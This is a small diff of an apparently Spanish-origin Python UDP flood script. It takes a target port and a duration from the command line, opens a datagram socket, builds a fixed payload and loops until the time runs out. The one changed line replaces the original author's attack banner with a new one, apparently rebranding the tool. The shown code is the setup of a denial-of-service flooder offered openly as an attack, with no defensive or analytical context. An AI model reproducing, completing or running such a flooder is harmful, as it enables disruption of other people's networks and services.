@@ -7,7 +7,7 @@ puerto = int(sys.argv[2])
 tiempo = time.time() + int(sys.argv[3])
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
-print("Atacando... - Made by CxS")
+print("Attack Started... Made By BuraKBeYy")
 while True:
     if time.time() > tiempo:
         break;
